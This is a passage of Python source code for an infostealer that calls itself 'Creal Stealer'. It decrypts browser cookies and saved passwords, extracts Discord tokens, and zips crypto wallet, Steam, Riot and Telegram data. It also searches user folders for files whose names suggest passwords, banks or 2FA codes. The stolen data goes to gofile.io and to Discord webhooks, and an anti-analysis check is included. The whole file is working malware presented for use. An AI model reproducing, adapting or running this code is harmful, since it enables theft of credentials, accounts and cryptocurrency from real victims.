            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
            CookiCount += 1
    writeforfile(Cookies, 'cook')

def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return

    pathC = path + arg

    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    # print(path, master_key)
    
    for file in os.listdir(pathC):
        # print(path, file)
        if file.endswith(".log") or file.endswith(".ldb")   :
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            # print(token)
                            Tokens += tokenDecoded
                            # writeforfile(Tokens, 'tokens')
                            uploadToken(tokenDecoded, path)

def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)
    
    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht: 
        thread.join()
    global WalletsZip, GamingZip, OtherZip
        # print(WalletsZip, GamingZip, OtherZip)

    wal, ga, ot = "",'',''
    if not len(WalletsZip) == 0:
        wal = ":coin:  •  Wallets\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = ":video_game:  •  Gaming:\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = ":tickets:  •  Apps\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"          
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    
    data = {
        "content": globalInfo(),
        "embeds": [
            {
            "title": "Creal Zips",
            "description": f"{wal}\n{ga}\n{ot}",
            "color": 000000,
            "footer": {
                "text": "Creal Stealer",
                "icon_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp"
            }
            }
        ],
        "username": "Creal Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp",
        "attachments": []
    }
    urlopen(Request(tgmkx, data=dumps(data).encode(), headers=headers))
    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file and not "tdummy" in file and not "user_data" in file and not "webview" in file: 
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])

def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip
    # subprocess.Popen(f"taskkill /im {procc} /t /f", shell=True)
    # os.system(f"taskkill /im {procc} /t /f")

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"Metamask_{browser}"
        pathC = path + arg
    
    if not os.path.exists(pathC): return
    subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1", shell=True)

    if "Wallet" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
        name = f"{browser}"

    elif "Steam" in arg:
        if not os.path.isfile(f"{pathC}/loginusers.vdf"): return
        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
        data = f.readlines()
        # print(data)
        found = False
        for l in data:
            if 'RememberPassword"\t\t"1"' in l:
                found = True
        if found == False: return
        name = arg


    zf = ZipFile(f"{pathC}/{name}.zip", "w")
    for file in os.listdir(pathC):
        if not ".zip" in file: zf.write(pathC + "/" + file)
    zf.close()

    lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
    #lnik = "https://google.com"
    os.remove(f"{pathC}/{name}.zip")

    if "Wallet" in arg or "eogaeaoehlef" in arg:
        WalletsZip.append([name, lnik])
    elif "NationsGlory" in name or "Steam" in name or "RiotCli" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '
    browserPaths = [
        [f"{roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
        [f"{local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
        [f"{local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
    ]

    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]

    PathsToZip = [
        [f"{roaming}/atomic/Local Storage/leveldb", '"Atomic Wallet.exe"', "Wallet"],
        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [f"{roaming}/NationsGlory/Local Storage/leveldb", "NationsGlory.exe", "NationsGlory"],
        [f"{local}/Riot Games/Riot Client/Data", "RiotClientServices.exe", "RiotClient"]
    ]
    Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]

    for patt in browserPaths: 
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths: 
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths: 
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths: 
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()


    for thread in ThCokk: thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True: return

    for patt in browserPaths:
         threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
    
    for patt in PathsToZip:
         threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
    
    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()

    for thread in Threadlist: 
        thread.join()
    global upths
    upths = []

    for file in ["wppassw.txt", "wpcook.txt"]: 
        # upload(os.getenv("TEMP") + "\\" + file)
        upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))

def uploadToAnonfiles(path):
    try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
    except:return False

# def uploadToAnonfiles(path):s
#     try:
#         files = { "file": (path, open(path, mode='rb')) }
#         upload = requests.post("https://transfer.sh/", files=files)
#         url = upload.text
#         return url
#     except:
#         return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["folder", pathF + "/", ffound])

KiwiFiles = []
def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append([path + "/" + file, uploadToAnonfiles(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])

def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "/Desktop",
        user + "/Downloads",
        user + "/Documents"
    ]

    key_wordsFolder = [
        "account",
        "acount",
        "passw",
        "secret"

    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",                                                          
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "mom",
        "family"
        ]

    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles]);kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = [] # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]       
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)
